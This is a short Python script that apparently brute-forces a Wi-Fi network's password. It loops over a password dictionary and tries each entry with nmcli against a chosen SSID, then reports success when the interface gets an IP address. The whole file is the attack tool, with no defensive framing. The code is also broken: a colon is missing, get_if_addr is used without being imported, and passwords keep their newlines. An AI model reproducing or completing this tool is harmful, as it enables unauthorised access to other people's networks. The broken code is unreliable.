import sys
import subprocess
from scapy.all import conf, Route

def main(args):
    try:
        SSID = args[1]
        dictionary = open(args[2], 'r')
    except IndexError:
        print("Need to supply a network SSID and a password list")
    try:
        iface = args[3]
    except IndexError:
        iface = conf.iface
    for password in dictionary:
        subprocess.run(["nmcli", "dev", "wifi", "connect", SSID, "password", password])
        if(get_if_addr(iface) != '0.0.0.0')
            print("SUCCESS - Password for " + SSID + "is" + password)
            exit(0)
    print("Password not in dictionary")

    
